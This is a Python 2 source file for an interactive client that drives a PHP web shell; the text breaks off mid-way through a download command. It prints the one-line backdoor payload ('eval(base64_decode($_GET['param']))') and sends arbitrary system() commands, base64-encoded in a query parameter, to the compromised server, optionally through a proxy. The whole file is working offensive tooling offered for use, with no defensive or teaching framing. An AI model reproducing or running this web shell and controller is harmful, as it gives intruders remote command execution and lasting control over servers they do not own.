
import base64
import httplib
from urlparse import urlparse
from urllib import quote_plus
from cmd import Cmd
import os


class rshell(Cmd):

    pwd = ""
    old_pwd = ""

    def __init__(self, shell_url, proxy):
        Cmd.__init__(self)
        self.shell_url = shell_url
        self.proxy = proxy

    def do_help(self, line):
        print "help: Show this message"
        print "payload: show the shell code in php"
        print "Or write a command to send the server shell"

    def default(self, line):
        #This is the default command method
        #system function is called with the command to execute
        s = "system('{0}');".format(line)
        #building url
        url = self.shell_url + '?param='
        #adding base64 encoded parameter
        #the [:-1] is because encodestring add a \n at the end
        url += quote_plus(base64.encodestring(s)[:-1])
        #doing the request to the server
        self.dorequest(url)

    def do_quit(self, line):
        exit(0)

    def do_exit(self, line):
        exit(0)

    def dorequest(self, fullurl):
        parsed_url = urlparse(fullurl)
        url = ''
        con = None
        if self.proxy:
            (ip, port) = self.proxy.split(':')
            con = httplib.HTTPConnection(ip, int(port))
            url = fullurl
        else:
            url = parsed_url.path + '?' + parsed_url.query
            con = httplib.HTTPConnection(parsed_url.netloc, parsed_url.port)
        if con:
            con.request('GET', url)
            response = con.getresponse()
            if response.status == 200:
                print response.read()
            else:
                print response.status
        else:
            print "Can't connect"

    def do_shell(self, line):
        #This method execute the command locally
        print os.popen(line).read()

    def do_payload(self, line):
        self.print_payload()

    def do_phpinfo(self, line):
        #This is the default command method
        #system function is called with the command to execute
        s = "phpinfo();"
        #building url
        url = self.shell_url + '?param='
        #adding base64 encoded parameter
        #the [:-1] is because encodestring add a \n at the end
        url += quote_plus(base64.encodestring(s)[:-1])
        #doing the request to the server
        self.dorequest(url)

    def print_payload(self):
        print "<?php eval(base64_decode($_GET['param'])); ?>"

    def do_download(self, line):
        files = line.split()
        
